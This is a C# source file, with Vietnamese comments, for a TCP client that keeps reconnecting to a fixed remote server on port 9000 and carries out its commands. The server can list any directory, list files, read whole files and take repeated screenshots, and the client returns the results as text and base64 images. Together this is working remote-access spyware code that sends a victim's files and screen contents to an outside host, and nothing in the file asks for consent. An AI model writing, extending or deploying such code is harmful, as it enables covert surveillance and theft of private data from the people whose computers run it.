using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.IO;
using System.Drawing;
using System.Drawing.Imaging;
using System.Threading;

namespace TCPClient
{
    class Program
    {
        static void Main(string[] args)
        {
            // khai báo các biến kết nối tới server
            IPAddress zIP;
            string zData_Send = "", zData_Received = "", zServer_IP = "///";
            int zPort = 9000;
            Random r = new Random();
            int a = r.Next(1, 100);
            bool severconnect = false, isconnect = false;

            //nhập địa chỉ ip cần kết nối
            //Console.Write("Input server'IP Address : ");
            //zServer_IP = Console.ReadLine();
            zIP = IPAddress.Parse(zServer_IP);


            //nhập cổng kết nối/giao tiếp
            //Console.Write("Port :");
            //zPort = int.Parse(Console.ReadLine());


            //vòng lập kiểm tra client luôn kết nối tới server
            while (severconnect != true)
            {
                isconnect = false;
                while (isconnect != true)
                {
                    // kiểm lổi trước khi kết nối
                    try
                    {
                        //bắt đầu kết nối tới server
                        TcpClient zClient = new TcpClient();
                        Console.WriteLine("Connect the socket to the port where the server is listening ....");
                        zClient.Connect(zIP, zPort);

                        // Send and Recevie/ sử dụng thư viên stream để đọc ghi dữ liệu
                        Console.WriteLine("=========================");

                        NetworkStream zNetStream = zClient.GetStream();
                        StreamWriter zStreamSend = new StreamWriter(zNetStream);
                        StreamReader zStreamReceive = new StreamReader(zNetStream);

                        // tạo vòng lập ghi lệnh
                        while (zData_Send.ToUpper() != "GOODBYE")
                        {
                            try
                            {
                                zData_Received = zStreamReceive.ReadLine();
                                Console.WriteLine("Client <- : " + zData_Received);

                                //cắt chủ để hiểu lệnh ví dụ lệnh : DIR,FIL,REA, ....
                                string zCommend = zData_Received.Substring(0, 3);

                                // lấy thông tin folders 
                                if (zCommend.ToUpper() == "DIR")
                                {
                                    string zPath = zData_Received.Substring(4, zData_Received.Length - 4);

                                    string[] zFolders = Directory.GetDirectories(zPath);

                                    string folders = string.Join(";", zFolders);

                                    zStreamSend.WriteLine(folders);
                                    zStreamSend.Flush();
                                }
                                // lấy thông tin FIL
                                else if (zCommend.ToUpper() == "FIL")
                                {
                                    string zPath = zData_Received.Substring(4, zData_Received.Length - 4);

                                    string[] zFiles = Directory.GetFiles(zPath);

                                    string files = string.Join(";", zFiles);

                                    zStreamSend.WriteLine(files);
                                    zStreamSend.Flush();
                                }
                                // đọc thông tin file
                                else if (zCommend.ToUpper() == "REA")
                                {
                                    string zPath = zData_Received.Substring(4, zData_Received.Length - 4);

                                    string[] zFiles = File.ReadAllLines(zPath);

                                    string files = string.Join(";", zFiles);

                                    zStreamSend.WriteLine(files);
                                    zStreamSend.Flush();
                                }
                                // lệnh lấy ảnh
                                else if (zData_Received.ToUpper() == "ANH")
                                {
                                    for (int i = 0; i < 3; i++)
                                    {
                                        // Take a screenshot
                                        using (Bitmap bitmap = new Bitmap(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width, System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
                                        {
                                            using (Graphics graphics = Graphics.FromImage(bitmap))
                                            {
                                                graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                                            }

                                            // Convert the image to base64 string
                                            ImageConverter converter = new ImageConverter();
                                            byte[] imgBytes = (byte[])converter.ConvertTo(bitmap, typeof(byte[]));
                                            string base64String = Convert.ToBase64String(imgBytes);

                                            // Send the screenshot to the server
                                            zStreamSend.WriteLine(base64String);
                                            zStreamSend.Flush();
                                        }

                                        // Wait for some time before taking the next screenshot
                                        Thread.Sleep(1000);
                                    }
                                }

                                else
                                {
                                    zStreamSend.WriteLine("khong hieu muon gia !");
                                    zStreamSend.Flush();
                                }
                            }
                            catch (Exception ex)
                            {
                                //Console.WriteLine(ex.ToString());
                                break;
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        //Console.WriteLine(ex.ToString());
                        isconnect = true;
                        severconnect = false;
                        break;
                    }


                }
            }

            Console.WriteLine("==============================");
            Console.WriteLine("Close the connection ");
            Console.ReadKey();
        }
    }
}
